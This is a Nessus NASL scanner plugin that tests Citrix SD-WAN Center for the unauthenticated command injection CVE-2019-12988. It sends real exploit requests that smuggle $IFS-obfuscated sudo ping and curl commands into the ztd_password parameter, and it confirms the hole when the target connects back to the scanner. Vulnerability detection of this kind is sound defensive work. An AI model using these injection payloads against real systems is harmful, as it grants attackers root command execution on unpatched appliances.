#TRUSTED a7ee3229fda9bd34b5f52ae3fdc98d74d13bad89d069703a7543bfe7a409225d828f61a5ca0627180d5b83cf949776050179f6c58401f3285115bee4c3c40aeb87edae55d2f9e14dae35f94b87286f183b4a5e4ef1464f6bd9fdeba49950f996de4bc6879755ecea65d8753dfbb1989763e3c7200a98638f5c1e7dd11c2590ca78fdab0fda921286a4e82d9a5c8a33c4b9f6a46a6b430acdc4f9d1c9f0837a986a5d0f8f20676d9ccb79b1da615fa604651047becf59cf096c16559d685e7391c65f62d0e7a95988cd0d632b4dd42c9fa6673e1d7d11e9167d0f063de26f964c9648cac75f40dd5069f3e1a94c8553f16bd4a5f896a6c3498768c6f1ffb14e2280b85e5801b6068745b0353e514b801f240283f3670508f000bd0caf4803e5673f85196d9f6b39c6b8993f5d5e5636c532fc72c7913dcb49b7c001fa9a424a00c8cd649773f2d37469fe70ac0e763a572c8857e91e86379eeb6c73a98bd6be084c99886696cb30c1105cf6efe49fcfd18deb91eef19ee942a5dfa051346e58502b5539db66cde6c7484d07914f69aa11714b5c78ea960c812173acd6d6fc90f4bd083b89afcda911ddb68fb4b5673417c1095a52211cb1be00d965a9ffc873795f9ff6a9a216f8c54c91a730d80262b0a0dba6a3a9400d821dd4dc654dc5324cf4487e4eed0c54f4a833e8d73b6adb7edb912e520d7ced0245e61741fd8acab2
#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(130347);
  script_version("1.6");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2019-12988");
  script_bugtraq_id(109133);
  script_xref(name:"TRA", value:"TRA-2019-31");

  script_name(english:"Citrix SD-WAN Center and NetScaler SD-WAN Center addModifyZTDProxy Unauthenticated Remote Command Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote command injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Citrix SD-WAN Center or NetScaler SD-WAN Center is affected by a remote command injection vulnerability due
to improper sanitization of user-supplied input in the addModifyZTDProxy action of NmsController. An unauthenticated,
remote attacker can exploit this, via a specially crafted HTTP request, to execute arbitrary commands on the remote
host with root privileges.

Note that Nessus can perform an additional check for this vulnerability. To do so, re-run the scan with the setting
'Perform thorough tests (may disrupt your network or impact scan speed)' enabled.");
  script_set_attribute(attribute:"see_also", value:"https://support.citrix.com/article/CTX251987");
  # https://www.tenable.com/blog/multiple-vulnerabilities-found-in-citrix-sd-wan-center-and-sd-wan-appliances
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a1b1f9a7");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Citrix SD-WAN Center version 10.2.3 or later or NetScaler SD-WAN Center version 10.0.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-12988");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/07/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/06/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/10/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:citrix:sd-wan-center");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("citrix_sdwan_center_detect.nbin");
  script_require_keys("installed_sw/Citrix SD-WAN Center");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('install_func.inc');
include('misc_func.inc');
include('http.inc');
include('spad_log_func.inc');
include('url_func.inc');

##
# RCE exploitation of the addModifyZTDProxy action in NmsController with an injected ping
#
# @remark Check RCE by suppling a ping command containing specific padding data to the addModifyZTDProxy action in NmsController
#
# @return array containing: a boolean that is true if the SD-WAN center is
# vulnerable as well as information for security report if necessary.
##
function check_ping() {
  var ping_cmd = '$(sudo$IFS/bin/ping$IFS-c2$IFS-p' + pattern + '$IFS$(/bin/echo$IFS-e$IFS\\x3' + compat::this_host() + '))';
  var get_url = url_dir + '?' + get_params_start + ping_cmd;

  var ping_request =
    'GET ' + get_url + ' HTTP/1.1\r\n' +
    'Host: ' + get_host_ip() + '\r\n' +
    'User-Agent: Nessus' + '\r\n' +
    'Accept: */*' + '\r\n' + '\r\n';

  spad_log(message:'Attempting to inject ping with:\n' + ping_request + '\n');

  var soc = open_sock_tcp(port);
  if (!soc)
    audit(AUDIT_SOCK_FAIL, port);

  var filter = 'icmp and icmp[0] = 8 and src host ' + get_host_ip();
  var ping_response = send_capture(socket:soc, data:ping_request, pcap_filter:filter);
  close(soc);

  if (empty_or_null(ping_response))
  {
    spad_log(message:'The ICMP response was empty or null\n');
    return {'vuln':false};
  }

  var icmp_data = toupper(hexstr(get_icmp_element(icmp:ping_response, element:'data')));
  spad_log(message:'Received ping with data: \n' + icmp_data);

  if (empty_or_null(icmp_data) || (pattern >!< icmp_data))
    return {'vuln':false};

  var rep_extra = '\nThe following command was executed on the vulnerable host:\n\n'
    + ping_cmd;
  return {'vuln':true, 'request':make_list(ping_request), 'rep_extra':rep_extra};
}

##
# RCE exploitation of the addModifyZTDProxy action in NmsController with an injected curl
#
# @remark Check RCE by suppling a curl command to the addModifyZTDProxy action in NmsController
#
# @return array containing: a boolean that is true if the SD-WAN center is
# vulnerable as well as information for security report if necessary.
##
function check_curl() {
  # Open TCP socket on server to get back connections from targets
  var bind_result = bind_sock_tcp();

  if (isnull(bind_result))
    audit(AUDIT_SOCK_FAIL, port);

  var bind_sock = bind_result[0];
  var bind_port = bind_result[1];

  spad_log(message:'Attempting exploitation with back connect port: ' + bind_port + '\n');

  var curl_cmd = '$(sudo$IFS/usr/bin/curl$IFS$(/bin/echo$IFS-e$IFS\\x3' + compat::this_host() + ':' + bind_port + '/Nessus' + pattern + '))';
  var get_url = url_dir + '?' + get_params_start + curl_cmd;

  var post_response = http_send_recv3(
    method        : 'GET',
    item          : get_url,
    port          : port);

  var request_sent = http_last_sent_request();

  spad_log(message:'Attempted to inject curl with the following request:\n' + request_sent);

  if (!empty_or_null(post_response))
    spad_log(message:'The POST response was:\n' + post_response + '\n');

  # Listen for HTTP connect back
  var accept_sock = sock_accept(socket:bind_sock, timeout:10);
  if (!accept_sock)
  {
    close(bind_sock);
    spad_log(message:'Did not receive a connect back.\n');
    return {'vuln':false};
  }

  var curl_response = recv(socket:accept_sock, length:1024);

  if (empty_or_null(curl_response))
  {
    close(accept_sock);
    close(bind_sock);
    spad_log(message:'Empty response.\n');
    return {'vuln':false};
  }

  spad_log(message:'Successful connect back, received response: \n' + curl_response);

  close(accept_sock);
  close(bind_sock);

  if ('Nessus' + pattern >!< curl_response)
    return {'vuln':false};

  var rep_extra = '\nSuccessful connect back, received response:\n\n' + curl_response;
  return {'vuln':true, 'request':make_list(request_sent), 'rep_extra':rep_extra};
}

#
# Main
#

app_name = 'Citrix SD-WAN Center';
# Exit if app is not detected on the target host
get_install_count(app_name:app_name, exit_if_zero:TRUE);
port = get_http_port(default:443);

# Exit if app is not detected  on this port
get_single_install(
  app_name : app_name,
  port     : port
);

# Generate a random pattern for the payload to prove the vulnerability
pattern = rand_str(length:8, charset:'0123456789ABCDEF');
spad_log(message:'The pattern for exploit identification is: ' + pattern + '\n');
url_dir =  '/Collector/nms/addModifyZTDProxy';
get_params_start =  'ztd_port=3333&ztd_username=user&ztd_password=';

# Try to inject and detect a ping with the pattern
result = check_ping();

# If the ping injection did not succeed and thorough tests is enabled, try to
# inject curl and listen for an incoming request.
if (!result['vuln'] && thorough_tests)
  result = check_curl();

# If the command injection did not succeed, then audit as not vulnerable.
if (!result['vuln'])
  audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

# Otherwise, a command injection succeeded so report it as vulnerable
security_report_v4(
  port: port,
  severity: SECURITY_HOLE,
  generic: TRUE,
  request: result['request'],
  rep_extra: result['rep_extra']
);
